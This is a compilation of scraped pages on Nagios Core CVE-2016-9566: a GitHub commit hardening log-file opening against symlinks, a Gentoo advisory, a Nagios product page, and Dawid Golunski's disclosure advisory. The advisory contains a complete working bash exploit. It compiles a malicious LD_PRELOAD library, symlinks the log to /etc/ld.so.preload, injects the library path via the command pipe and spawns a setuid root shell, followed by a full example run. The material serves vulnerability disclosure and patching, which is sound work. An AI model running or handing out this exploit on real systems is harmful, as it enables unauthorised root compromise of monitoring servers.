| Expand Up | | @@ -70,6 +70,7 @@ wrong, please let me know. |
|  |  | \* David Kmoch |
|  |  | \* David Schlecht |
|  |  | \* David Tilloy |
|  |  | \* Dawid Golunski |
|  |  | \* Dean Lane |
|  |  | \* Denis Seleznyov |
|  |  | \* Dennis Biringer |
| Expand Down | |  |

50 changes: 44 additions & 6 deletions

50
[base/logging.c](#diff-0c8c08c90ed4120a4abb201a98f452cd34f1630ca28d07c28bbd51056104ab6f "base/logging.c")

Show comments

[View file](/NagiosEnterprises/nagioscore/blob/c29557dec91eba2306f5fb11b8da4474ba63f8c4/base/logging.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -112,17 +112,39 @@ static void write\_to\_all\_logs\_with\_timestamp(char \*buffer, unsigned long data\_ty |
|  |  |  |
|  |  | static FILE \*open\_log\_file(void) |
|  |  | { |
|  |  | int fh; |
|  |  | struct stat st; |
|  |  |  |
|  |  | if(log\_fp) /\* keep it open unless we rotate \*/ |
|  |  | return log\_fp; |
|  |  |  |
|  |  | log\_fp = fopen(log\_file, "a+"); |
|  |  | if ((fh = open(log\_file, O\_RDWR|O\_APPEND|O\_CREAT|O\_NOFOLLOW, S\_IRUSR|S\_IWUSR)) == -1) { |
|  |  | if (daemon\_mode == FALSE) |
|  |  | printf("Warning: Cannot open log file '%s' for writing\n", log\_file); |
|  |  | return NULL; |
|  |  | } |
|  |  | log\_fp = fdopen(fh, "a+"); |
|  |  | if(log\_fp == NULL) { |
|  |  | if (daemon\_mode == FALSE) { |
|  |  | if (daemon\_mode == FALSE) |
|  |  | printf("Warning: Cannot open log file '%s' for writing\n", log\_file); |
|  |  | } |
|  |  | return NULL; |
|  |  | } |
|  |  |  |
|  |  | if ((fstat(fh, &st)) == -1) { |
|  |  | log\_fp = NULL; |
|  |  | close(fh); |
|  |  | if (daemon\_mode == FALSE) |
|  |  | printf("Warning: Cannot fstat log file '%s'\n", log\_file); |
|  |  | return NULL; |
|  |  | } |
|  |  | if (st.st\_nlink != 1 || (st.st\_mode & S\_IFMT) != S\_IFREG) { |
|  |  | log\_fp = NULL; |
|  |  | close(fh); |
|  |  | if (daemon\_mode == FALSE) |
|  |  | printf("Warning: log file '%s' has an invalid mode\n", log\_file); |
|  |  | return NULL; |
|  |  | } |
|  |  |  |
|  |  | (void)fcntl(fileno(log\_fp), F\_SETFD, FD\_CLOEXEC); |
|  |  | return log\_fp; |
|  |  | } |
| Expand Down  Expand Up | | @@ -447,7 +469,10 @@ int write\_log\_file\_info(time\_t \*timestamp) { |
|  |  |  |
|  |  |  |
|  |  | /\* opens the debug log for writing \*/ |
|  |  | int open\_debug\_log(void) { |
|  |  | int open\_debug\_log(void) |
|  |  | { |
|  |  | int fh; |
|  |  | struct stat st; |
|  |  |  |
|  |  | /\* don't do anything if we're not actually running... \*/ |
|  |  | if(verify\_config || test\_scheduling == TRUE) |
| Expand All | | @@ -457,10 +482,23 @@ int open\_debug\_log(void) { |
|  |  | if(debug\_level == DEBUGL\_NONE) |
|  |  | return OK; |
|  |  |  |
|  |  | if((debug\_file\_fp = fopen(debug\_file, "a+")) == NULL) |
|  |  | if ((fh = open(debug\_file, O\_RDWR|O\_APPEND|O\_CREAT|O\_NOFOLLOW, S\_IRUSR|S\_IWUSR)) == -1) |
|  |  | return ERROR; |
|  |  | if((debug\_file\_fp = fdopen(fh, "a+")) == NULL) |
|  |  | return ERROR; |
|  |  |  |
|  |  | if ((fstat(fh, &st)) == -1) { |
|  |  | debug\_file\_fp = NULL; |
|  |  | close(fh); |
|  |  | return ERROR; |
|  |  | } |
|  |  | if (st.st\_nlink != 1 || (st.st\_mode & S\_IFMT) != S\_IFREG) { |
|  |  | debug\_file\_fp = NULL; |
|  |  | close(fh); |
|  |  | return ERROR; |
|  |  | } |
|  |  |  |
|  |  | (void)fcntl(fileno(debug\_file\_fp), F\_SETFD, FD\_CLOEXEC); |
|  |  | (void)fcntl(fh, F\_SETFD, FD\_CLOEXEC); |
|  |  |  |
|  |  | return OK; |
|  |  | } |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `c29557d`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNagiosEnterprises%2Fnagioscore%2Fcommit%2Fc29557dec91eba2306f5fb11b8da4474ba63f8c4) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.gentoo.org_055e1436_20250124_212420.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Nagios: Multiple vulnerabilities — GLSA **201710-20**

Multiple vulnerabilities have been found in Nagios, the worst of
which could lead to the remote execution of arbitrary code.

### Affected packages

| Package | **net-analyzer/nagios-core** on all architectures |
| --- | --- |
| Affected versions | < **4.3.3** |
| Unaffected versions | >= **4.3.3** |

### Background

Nagios is an open source host, service and network monitoring program.

### Description

Multiple vulnerabilities have been discovered in Nagios. Please review
the referenced CVE identifiers for details.

### Impact

A remote attacker could possibly escalate privileges to root, thus
allowing the execution of arbitrary code, by leveraging CVE-2016-9565.
Additionally, a local attacker could cause a Denial of Service condition
against arbitrary processes due to the improper dropping of privileges.

### Workaround

There is no known workaround at this time.

### Resolution

All Nagios users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-analyzer/nagios-core-4.3.3"

```
### References

* [CVE-2016-9565](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-9565)
* [CVE-2016-9566](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2016-9566)
* [CVE-2017-12847](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2017-12847)

**Release date**

October 18, 2017

**Latest revision**

October 18, 2017: 1

**Severity**

normal

**Exploitable**

local, remote

**Bugzilla entries**

* [602216](https://bugs.gentoo.org/show_bug.cgi?id=602216)
* [628086](https://bugs.gentoo.org/show_bug.cgi?id=628086)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from legalhackers.com_73de0957_20250126_033745.html ===

```

[__                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/](https://legalhackers.com)

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Interested in security / vulns / exploits ?
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)

[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-9566
- Release date: 15.12.2016
- Revision 1.0
- Severity: High
=============================================

I. VULNERABILITY
-------------------------

Nagios Core < 4.2.4 - Root Privilege Escalation

II. BACKGROUND
-------------------------

"Nagios Is The Industry Standard In IT Infrastructure Monitoring

Achieve instant awareness of IT infrastructure problems, so downtime doesn't
adversely affect your business.

Nagios offers complete monitoring and alerting for servers, switches,
applications, and services."

<https://www.nagios.org/>

III. INTRODUCTION
-------------------------

Nagios Core daemon in versions below 4.2.4 was found to perform unsafe
operations when handling the log file. This could be exploited by
malicious local attackers to escalate their privileges from 'nagios' system user,
or from a user belonging to 'nagios' group, to root.
The exploit could enable the attackers to fully compromise the system on which a
vulnerable Nagios version was installed.

To obtain the necessary level of access, the attackers could use another
Nagios vulnerability discovered by the author of this advisory - CVE-2016-9565
which has been linked in the references.

IV. DESCRIPTION
-------------------------

Default installation of Nagios Core creates the log directory with the
following permissions:

drwxrwsr-x 5 nagios nagios

Nagios daemon was found to open the log file before dropping its root
privileges on startup:

8148  open("/usr/local/nagios/var/nagios.log",
O_RDWR|O_CREAT|O_APPEND, 0666) = 4
8148  fcntl(4, F_SETFD, FD_CLOEXEC)     = 0
8148  fchown(4, 1001, 1001)             = 0
8148  getegid()                         = 0
8148  setgid(1001)                      = 0
8148  geteuid()                         = 0
[...]

If an attacker managed to gain access to an account of 'nagios' or any
other account belonging to the 'nagios' group, they would be able to
replace the log file with a symlink to an arbitrary file on the system.

This vulnerability could be used by an attacker to escalate their privileges
from nagios user/group to root for example by creating a malicious
/etc/ld.so.preload file.

The file would be created with the following nagios permissions due to
the fchown operation shown above:

-rw-r--r-- 1 nagios nagios 950 Dec 10 11:56 /etc/ld.so.preload

which would enable write access to the file for the 'nagios' user
but not the 'nagios' group.

Gaining write access to ld.so.preload as 'nagios' group
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If the attacker managed to exploit the CVE-2016-9565 vulnerability explained at:

<https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>

they would gain access to www-data account belonging to 'nagios' group in case
of a default Nagios install following the official Nagios setup guide:

<https://assets.nagios.com/downloads/nagioscore/docs/Installing_Nagios_Core_From_Source.pdf>

This would not be enough to write to ld.so.preload file as 'nagios' group is
only allowed to read the log file.

Attackers with access to 'nagios' group could however bypass the lack of
write privilege by writing to Nagios external command pipe (nagios.cmd) which
is writable by 'nagios' group by default:

prw-rw---- 1 nagios nagios 0 Dec 10 19:39 nagios.cmd

The Nagios command pipe allows to communicate with Nagios daemon.

By sending an invalid command to the pipe, the attacker could bypass the lack
of write permission and inject data to the log file (pointing to ld.so.preload).

For example, by running the command:

/usr/bin/printf "[%lu] NAGIOS_GIVE_ME_ROOT_NOW!;; /tmp/nagios_privesc_lib.so \n" `date +%s` > /usr/local/nagios/var/rw/nagios.cmd

Nagios daemon would append the following line to the log file:

[1481439996] Warning: Unrecognized external command -> NAGIOS_GIVE_ME_ROOT_NOW!;; /tmp/nagios_privesc_lib.so

which would be enough to load a malicious library and escalate the privileges
from a www-data user (belonging to 'nagios' group) to root upon a Nagios restart.

Forcing restart of Nagios daemon
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Attackers could speed up the restart by using the Nagios command pipe once again
to send a SHUTDOWN_PROGRAM command as follows:

/usr/bin/printf "[%lu] SHUTDOWN_PROGRAM\n" `date +%s` > /usr/local/nagios/var/rw/nagios.cmd

V. PROOF OF CONCEPT EXPLOIT
-------------------------

-----------[ nagios-root-privesc.sh ]--------------

#!/bin/bash
#
# Nagios Core < 4.2.4  Root Privilege Escalation PoC Exploit
# nagios-root-privesc.sh (ver. 1.0)
#
# CVE-2016-9566
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# <https://legalhackers.com>
#
# Follow <https://twitter.com/dawid_golunski> for updates on this advisory
#
#
# [Info]
#
# This PoC exploit allows privilege escalation from 'nagios' system account,
# or an account belonging to 'nagios' group, to root (root shell).
# Attackers could obtain such an account via exploiting another vulnerability,
# e.g. CVE-2016-9565 linked below.
#
# [Exploit usage]
#
# ./nagios-root-privesc.sh path_to_nagios.log
#
#
# See the full advisory for details at:
# <https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>
#
# Video PoC:
# <https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>
#
# CVE-2016-9565:
# <https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nagiosrootsh"
PRIVESCLIB="/tmp/nagios_privesc_lib.so"
PRIVESCSRC="/tmp/nagios_privesc_lib.c"
SUIDBIN="/usr/bin/sudo"
commandfile='/usr/local/nagios/var/rw/nagios.cmd'

function cleanexit {
	# Cleanup
	echo -e "\n[+] Cleaning up..."
	rm -f $PRIVESCSRC
	rm -f $PRIVESCLIB
	rm -f $ERRORLOG
	touch $ERRORLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload
	fi
	echo -e "\n[+] Job done. Exiting with code $1 \n"
	exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
	cleanexit 0
}

#intro

echo -e "\033[94m \nNagios Core - Root Privilege Escalation PoC Exploit (CVE-2016-9566) \nnagios-root-privesc.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \n<https://legalhackers.com> \033[0m"

# Priv check
echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q nagios
if [ $? -ne 0 ]; then
	echo -e "\n[!] You need to execute the exploit as 'nagios' user or 'nagios' group ! Exiting.\n"
	exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f "$ERRORLOG" ]; then
	echo -e "\n[!] Provided Nagios log path ($ERRORLOG) doesn't exist. Try again. E.g: \n"
	echo -e "./nagios-root-privesc.sh /usr/local/nagios/var/nagios.log\n"
	exit 3
fi

# [ Exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown("$BACKDOORPATH", 0, 0);
		chmod("$BACKDOORPATH", 04777);
		unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
	echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
	cleanexit 2;
fi

# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
	echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
	exit 2
fi

# Symlink the Nagios log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
	echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
	cleanexit 3
fi
echo -e "\n[+] The system appears to be exploitable (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"

{
# Wait for Nagios to get restarted
echo -ne "\n[+] Waiting for Nagios service to get restarted...\n"
echo -n "Do you want to shutdown the Nagios daemon to speed up the restart process? ;) [y/N] "
read THE_ANSWER
if [ "$THE_ANSWER" = "y" ]; then
	/usr/bin/printf "[%lu] SHUTDOWN_PROGRAM\n" `date +%s` > $commandfile
fi
sleep 3s
ps aux | grep -v grep | grep -i 'bin/nagios'
if [ $? -ne 0 ]; then
	echo -ne "\n[+] Nagios stopped. Shouldn't take long now... ;)\n"
fi
while :; do
	sleep 1 2>/dev/null
	if [ -f /etc/ld.so.preload ]; then
		rm -f $ERRORLOG
		break;
	fi
done

echo -e "\n[+] Nagios restarted. The /etc/ld.so.preload file got created with the privileges: \n`ls -l /etc/ld.so.preload`"

# /etc/ld.so.preload should be owned by nagios:nagios at this point with perms:
# -rw-r--r-- 1 nagios nagios
# Only 'nagios' user can write to it, but 'nagios' group can not.
# This is not ideal as in scenarios like CVE-2016-9565 we might be running as www-data:nagios user.
# We can bypass the lack of write perm on /etc/ld.so.preload by writing to Nagios external command file/pipe
# nagios.cmd, which is writable by 'nagios' group. We can use it to send a bogus command which will
# inject the path to our privesc library into the nagios.log file (i.e. the ld.so.preload file :)

sleep 3s 	# Wait for Nagios to create the nagios.cmd pipe
if [ ! -p $commandfile ]; then
	echo -e "\n[!] Nagios command pipe $commandfile does not exist!"
	exit 2
fi
echo -e "\n[+] Injecting $PRIVESCLIB via the pipe nagios.cmd to bypass lack of write perm on ld.so.preload"
now=`date +%s`
/usr/bin/printf "[%lu] NAGIOS_GIVE_ME_ROOT_NOW!;; $PRIVESCLIB \n" $now > $commandfile
sleep 1s
grep -q "$PRIVESCLIB" /etc/ld.so.preload
if [ $? -eq 0 ]; then
	echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload | grep "$PRIVESCLIB"`"
else
	echo -e "\n[!] Unable to inject the lib to /etc/ld.so.preload"
	exit 2
fi

} 2>/dev/null

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Triggering privesc code from $PRIVESCLIB by executing $SUIDBIN SUID binary"
sudo 2>/dev/null >/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH | grep rws | grep -q root 2>/dev/null
if [ $? -eq 0 ]; then
	echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
	echo -e "\n\033[94mGot root via Nagios!\033[0m"
else
	echo -e "\n[!] Failed to get root: \n`ls -l $BACKDOORPATH`"
	cleanexit 2
fi

# Use the rootshell to perform cleanup that requires root privileges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
rm -f $ERRORLOG
echo > $ERRORLOG

# Execute the rootshell
echo -e "\n[+] Nagios pwned. Spawning the rootshell $BACKDOORPATH now\n"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0

---------------------------------------------------

Example run
~~~~~~~~~~~~~

www-data@debjessie:/tmp$ ./nagios-root-privesc.sh /usr/local/nagios/var/nagios.log
./nagios-root-privesc.sh /usr/local/nagios/var/nagios.log

Nagios Core - Root Privilege Escalation PoC Exploit (CVE-2016-9566)
nagios-root-privesc.sh (ver. 1.0)

Discovered and coded by:

Dawid Golunski
<https://legalhackers.com>

[+] Starting the exploit as:
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)

[+] Compiling the privesc shared library (/tmp/nagios_privesc_lib.c)

[+] Backdoor/low-priv shell installed at:
-rwxrwxrwx 1 root root 1029624 Dec 11 08:44 /tmp/nagiosrootsh

[+] The system appears to be exploitable (writable logdir) ! :) Symlink created at:
lrwxrwxrwx 1 www-data nagios 18 Dec 11 08:44 /usr/local/nagios/var/nagios.log -> /etc/ld.so.preload

[+] Waiting for Nagios service to get restarted...
Do you want to shutdown the Nagios daemon to speed up the restart process? ;) [y/N] y

[+] Nagios stopped. Shouldn't take long now... ;)

[+] Nagios restarted. The /etc/ld.so.preload file got created with the privileges:
-rw-r--r-- 1 nagios nagios 871 Dec 11 08:44 /etc/ld.so.preload

[+] Injecting /tmp/nagios_privesc_lib.so via the pipe nagios.cmd to bypass lack of write perm on ld.so.preload

[+] The /etc/ld.so.preload file now contains:
[1481463869] Warning: Unrecognized external command -> NAGIOS_GIVE_ME_ROOT_NOW!;; /tmp/nagios_privesc_lib.so

[+] Triggering privesc code from /tmp/nagios_privesc_lib.so by executing /usr/bin/sudo SUID binary

[+] Rootshell got assigned root SUID perms at:
-rwsrwxrwx 1 root root 1029624 Dec 11 08:44 /tmp/nagiosrootsh

Got root via Nagios!

[+] Nagios pwned. Spawning the rootshell /tmp/nagiosrootsh now

nagiosrootsh-4.3# exit
exit

[+] Cleaning up...

[+] Job done. Exiting with code 0

Video PoC:
~~~~~~~~~~~~~

<https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>

VI. BUSINESS IMPACT
-------------------------

An attacker who has managed to gain access to 'nagios' account, or an account
belonging to 'nagios' group (which is the case in the CVE-2016-9565 scenario)
to escalate their privileges to root and fully compromise the Nagios monitoring
server.

VII. SYSTEMS AFFECTED
-------------------------

Nagios Core < 4.2.4

Vendor notice:
<https://www.nagios.org/projects/nagios-core/history/4x/>

VIII. SOLUTION
-------------------------

Vendor received this advisory in advance and released a security
release of Nagios 4.2.4 to address this vulnerability.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

This advisory:
<https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>

Exploit code:
<https://legalhackers.com/exploits/CVE-2016-9566/nagios-root-privesc.sh>

CVE-2016-9566:
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9566>

Video PoC:
<https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>

Nagios Curl Command Injection / Code Exec with 'nagios' group (CVE-2016-9565):
<https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>

Nagios / Vendor links:

<https://www.nagios.org/>

CVE-2016-9566:
<https://www.nagios.org/projects/nagios-core/history/4x/>

<https://assets.nagios.com/downloads/nagioscore/docs/Installing_Nagios_Core_From_Source.pdf>

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com

<https://legalhackers.com>

XI. REVISION HISTORY
-------------------------

15.12.2016 - Advisory released

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Check out the new project of the same author:
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)
[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

```


=== Content from www.nagios.org_25d98c7a_20250126_033727.html ===


[Skip to content](#content)
[![](https://www.nagios.org/wp-content/uploads/2024/10/nagios-white-2.png)](https://www.nagios.org/launch)

[![](https://www.nagios.org/wp-content/uploads/2024/10/Nagios-N-White.png)](https://www.nagios.org/launch)

[Download](https://go.nagios.org/get-csp-zip)

* [Forum](https://www.nagios.org/community/)
* [FAQ](https://www.nagios.org/faq/)
* [Upgrade](https://www.nagios.org/upgrade/)
* [Projects](https://www.nagios.org/projects/)
  + [Nagios Core](https://www.nagios.org/projects/nagios-core/)
  + [Nagios Plugins](https://www.nagios.org/downloads/nagios-plugins/)
  + [Nagios Gearman](https://www.nagios.org/projects/nagios-mod-gearman/)
  + [Nagios Addons](https://www.nagios.org/downloads/nagios-core-addons/)
  + [Nagios Cross-Platform Agent](https://www.nagios.org/projects/ncpa/)
* [Team](https://www.nagios.org/team/)
* [Conference](http://www.nagios.com/conference/?utm_campaign=nwc2025&utm_source=org&utm_medium=headermenu)
* [The Nagios Story](https://www.nagios.org/story/)

* [Forum](https://www.nagios.org/community/)
* [FAQ](https://www.nagios.org/faq/)
* [Upgrade](https://www.nagios.org/upgrade/)
* [Projects](https://www.nagios.org/projects/)
  + [Nagios Core](https://www.nagios.org/projects/nagios-core/)
  + [Nagios Plugins](https://www.nagios.org/downloads/nagios-plugins/)
  + [Nagios Gearman](https://www.nagios.org/projects/nagios-mod-gearman/)
  + [Nagios Addons](https://www.nagios.org/downloads/nagios-core-addons/)
  + [Nagios Cross-Platform Agent](https://www.nagios.org/projects/ncpa/)
* [Team](https://www.nagios.org/team/)
* [Conference](http://www.nagios.com/conference/?utm_campaign=nwc2025&utm_source=org&utm_medium=headermenu)
* [The Nagios Story](https://www.nagios.org/story/)

Search

## The 2025 Nagios World Conference Is On!

Don’t miss your chance to attend the [2025 Nagios World Conference](https://www.nagios.com/conference/?utm_campaign=nwc2025&utm_source=org&utm_medium=homebanner) Sept 29th-Oct 2nd. Meet IT experts from around the world, increase your IT knowledge, up your monitoring game, hang out with the Nagios community, and enjoy great food and conversations in this exclusive event. [Early bird registration](https://www.nagios.com/conference/?utm_campaign=nwc2025&utm_source=org&utm_medium=homebanner) is just $1,495. Want to present? The [call for speakers](https://www.nagios.com/conference/callforspeakers/?utm_campaign=nwc2025&utm_source=org&utm_medium=homebanner) is open!

[![2025 Nagios World Conference](https://www.nagios.com/wp-content/uploads/2024/12/21859999079_d644474018_c-jpg.webp)](https://www.nagios.com/conference/?utm_campaign=nwc2025&utm_source=org&utm_medium=headermenu)

# Nagios Core Services Platform

## Enterprise Grade Monitoring Powered By **Open Source**.

Built on over 25 years of monitoring experience, the Nagios Core Services Platform provides insightful monitoring dashboards, time-saving monitoring wizards, and unmatched ease of use.  Use it for free indefinitely.

Use ‘**CSP50**‘ as your free key FOR LIFE!

Happy monitoring from our team to yours!

[Download](https://go.nagios.org/get-csp-zip)

[Migrate From Core](https://www.nagios.org/switch/)

Get install guides and tips via email

![CSP50 Dashboard Free](https://www.nagios.org/wp-content/uploads/2024/11/CSP50_Dashboard_Free.webp)

[![NagiosCSP Disc rev5 TransparentBackground](https://www.nagios.org/wp-content/uploads/2024/10/NagiosCSP_Disc_rev5_TransparentBackground.png)](https://go.nagios.org/get-csp-iso)

Prefer an ISO? Download it [here](https://go.nagios.org/get-csp-iso)

### Whats Included:

* Simplified Installation with a Streamlined Virtual Machine

* Highly Awarded Open Source Monitoring Engine

* Advanced Reporting and Management Tools

* Community Support

* Free License

### Comprehensive Monitoring:

* Windows, Apple, Linux, Unix Workstations and Servers

* Hundreds of Plugins to Extend Native Capabilities

* Network Switches, Firewalls, and Routers

* Email, FTP, DNS, and SSH services

* Dozens of easy to use wizards

* Application and Services

### Open Source Components Included:

* [Nagios Core](https://www.nagios.org/projects/nagios-core/)

* [Nagios Plugins](https://www.nagios.org/projects/nagios-plugins/)

* [Nagios Mod Gearman](https://www.nagios.org/projects/nagios-mod-gearman/) (Coming Soon)

* [NSClient++](https://www.nagios.org/downloads/nagios-core-addons/)

* [NDOUtils](https://www.nagios.org/downloads/nagios-core-addons/)

* [NCPA](https://www.nagios.org/downloads/nagios-core-addons/)

* [NRPE](https://www.nagios.org/downloads/nagios-core-addons/)

* [NSCA](https://www.nagios.org/downloads/nagios-core-addons/)

* [NagVis](https://www.nagios.org/downloads/nagios-core-addons/)

[See What’s Included](https://www.nagios.org/whats-included-in-nagios-csp/)

### Supported Hypervisors:

* VMware Workstation

* VirtualBox

* Hyper-V

* VirtualPC

* Proxmox

* And More!

### Platforms Supported:

* Windows

* Mac

* Linux

* Unix

### Get Monitoring Fast and Stay On Top Of Critical Updates.

Enter your email address to get the Nagios CSP download information, installation guides, tips and tricks, release updates, and more sent directly to your inbox.

### Prerequisites:

* Windows, Mac, Linux, or ESXi host environment

* VMware Workstation, VirtualBox, VirtualPC, Parallels, VMware Fusion, Proxmox, QEMU, KVM, or compatible hypervisor

## People Are Raving About Nagios CSP!

Go [here](https://www.nagios.org/what-people-are-saying/) to see what they’re saying

## Get Support Now

Visit the [support forum](https://www.nagios.org/community/) or visit the [FAQ](https://www.nagios.org/faq/)

## Go Pro and Prosper

To upgrade to a commercial use license and get access to the exclusive Nagios monitoring discord server,
go to [nagios.org/upgrade](https://www.nagios.org/upgrade/)

## Expand Your Monitoring Capabilities

To see more solutions in the Nagios Monitoring Suite, visit: <https://www.nagios.com/products/>

[![Nagios](https://www.nagios.org/wp-content/uploads/2023/12/Nagios-Logo.svg)](https://www.nagios.org)

[Facebook-f](https://www.facebook.com/NagiosInc)

[Youtube](https://www.youtube.com/nagiosvideo)

[Linkedin-in](https://www.linkedin.com/company/nagios-enterprises-llc)

[X-twitter](https://x.com/nagiosinc)

##### [Home](https://www.nagios.org/)

[Downloads](https://www.nagios.org/launch/)

[Forum](https://www.nagios.org/community/)

[FAQ](https://www.nagios.org/faq/)

[Upgrade](https://www.nagios.org/upgrade/)

##### [Legal](https://www.nagios.com/legal)

[Privacy Policy](https://www.nagios.com/legal/privacypolicy/)

[Terms of Use](https://www.nagios.com/legal/termsofuse/)

[Trademarks](https://www.nagios.com/legal/trademarks/)

##### [Projects](https://www.nagios.org/projects/)

[Nagios Core](https://www.nagios.org/projects/nagios-core/)

[Nagios Plugins](https://www.nagios.org/downloads/nagios-plugins/)

[Nagios Gearman](https://www.nagios.org/projects/nagios-mod-gearman/)

##### [Nagios CSP](https://www.nagios.org)

